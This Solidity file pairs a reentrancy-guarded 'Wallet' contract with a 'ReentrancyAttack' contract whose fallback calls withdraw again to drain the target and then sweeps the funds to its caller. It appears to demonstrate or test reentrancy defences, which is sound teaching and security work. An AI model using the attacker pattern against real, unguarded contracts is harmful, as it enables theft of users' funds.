// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

contract Wallet{
    uint public contractBalance;
    bool private locked;
    mapping(address => uint) internal balances;

    event DepositMade(address indexed accountAddress, uint amount);
    event WithdrawalMade(address indexed accountAddress, uint amount);
    event FallbackCalled(address indexed accountAddress);

    modifier noReentrancy() {
        require(!locked, "Stop making reentrancy calls! Please hold.");
        locked = true;
        _;
        locked = false;
    }

    modifier hasSufficientBalance(uint _withdrawAmount) {
        require(_withdrawAmount <= balances[msg.sender], "Not enough balance");
        _;
    }

    fallback() external {
        emit FallbackCalled(msg.sender);
        revert("Fallback function. Call a function that exists!");
    }

    receive() external payable {
        deposit();
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        contractBalance += msg.value;

        assert(contractBalance == address(this).balance);

        emit DepositMade(msg.sender, msg.value);
    }

    function withdraw(uint _withdrawAmount) public noReentrancy hasSufficientBalance(_withdrawAmount) {
        if (_withdrawAmount > 1 ether) {
            revert("You cannot withdraw more than 1 ETH per transaction");
        }

        balances[msg.sender] -= _withdrawAmount;
        contractBalance -= _withdrawAmount;

        payable(msg.sender).transfer(_withdrawAmount);

        assert(contractBalance == address(this).balance);

        emit WithdrawalMade(msg.sender, _withdrawAmount);
    }
}

contract ReentrancyAttack {
    Wallet public target;

    constructor(Wallet _target) {
        target = _target;
    }

    fallback() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
